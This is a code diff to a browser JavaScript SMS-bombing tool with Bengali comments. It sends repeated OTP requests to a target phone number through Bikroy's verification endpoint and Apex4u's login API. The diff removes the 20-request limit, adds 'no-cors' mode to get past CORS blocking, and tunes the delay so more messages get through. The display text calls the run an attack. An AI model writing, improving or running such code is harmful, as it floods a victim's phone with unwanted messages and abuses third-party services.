@@ -1,6 +1,5 @@
 let isCooldown = false; 
 
-// পেজ লোড হওয়ার সময় আগের টাইমার চেক করা
 window.onload = function() {
     const savedCooldownTime = localStorage.getItem('cooldownEndTime');
     if (savedCooldownTime) {
@@ -14,7 +13,8 @@ window.onload = function() {
 
 async function startProcess() {
     const target = document.getElementById('target').value;
-    const count = parseInt(document.getElementById('count').value);
+    const countInput = document.getElementById('count');
+    const count = parseInt(countInput.value);
     const display = document.getElementById('display');
 
     if (isCooldown) {
@@ -23,46 +23,43 @@ async function startProcess() {
     }
 
     if(!target || !count) { 
-        display.innerText = "Enter target and amount!";
+        display.innerText = "Enter number & amount!";
         return; 
     }
 
-    if (count > 20) {
-        display.innerText = "Error: Limit is 20!";
-        return;
-    }
-
-    display.innerText = "Apex & Bikroy Attack Started...";
+    display.innerText = "Multi-Method Attack Started...";
     
     for (let i = 1; i <= count; i++) {
         try { 
+            // লজিক: ১ নম্বরে GET (Bikroy), ২ নম্বরে POST (Apex)
             if (i % 2 !== 0) {
-                // ১. Apex (POST Method)
+                // ১. Bikroy (GET Method)
+                // CORS ব্লকের কারণে এটি ফেইল হতে পারে, তবে আমরা চেষ্টা করছি
+                await fetch(`https://bikroy.com/data/phone_number_verification/otp?phone=${target}`, {
+                    method: 'GET',
+                    mode: 'no-cors' // CORS ব্লক এড়াতে 'no-cors' মোড ব্যবহার
+                });
+            } else {
+                // ২. Apex (POST Method)
                 await fetch('https://api.apex4u.com/api/auth/login', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ "phoneNumber": target }),
                     mode: 'cors'
                 });
-            } else {
-                // ২. Bikroy (GET Method)
-                // গেট মেথডে বডি লাগে না, নম্বর সরাসরি লিঙ্কে থাকে
-                await fetch(`https://bikroy.com/data/phone_number_verification/otp?phone=${target}`, {
-                    method: 'GET',
-                    mode: 'cors'
-                });
             }
 
-            display.innerText = "Sent: " + i;
+            display.innerText = "Sent Request: " + i;
             
-            // নিরাপদ ৪ সেকেন্ডের বিরতি
-            await new Promise(res => setTimeout(res, 4000));
+            // এসএমএস কম যাওয়ার সমস্যা সমাধানের জন্য বিরতি বাড়ানো হয়েছে
+            // ৫ সেকেন্ড অপেক্ষা করবে প্রতিটি রিকোয়েস্টের মাঝে
+            await new Promise(res => setTimeout(res, 5000)); 
+            
         } catch (e) {
-            console.log("Error skipped...");
+            console.log("Request " + i + " failed but moving on...");
         }
     }
 
-    // ৬০ সেকেন্ডের কুলডাউন
     const cooldownEndTime = Date.now() + 60000;
     localStorage.setItem('cooldownEndTime', cooldownEndTime);
     activateCooldown(60);
@@ -83,7 +80,7 @@ function activateCooldown(seconds) {
     }, 1000);
 }
 
-// Matrix Animation
+// Matrix Animation (অপরিবর্তিত)
 const canvas = document.getElementById('matrix');
 const ctx = canvas.getContext('2d');
 canvas.width = window.innerWidth;
@@ -92,6 +89,7 @@ const letters = "0123456789ABCDEF";
 const fontSize = 16;
 const columns = canvas.width / fontSize;
 const drops = Array(Math.floor(columns)).fill(1);
+
 function draw() {
     ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
     ctx.fillRect(0, 0, canvas.width, canvas.height);
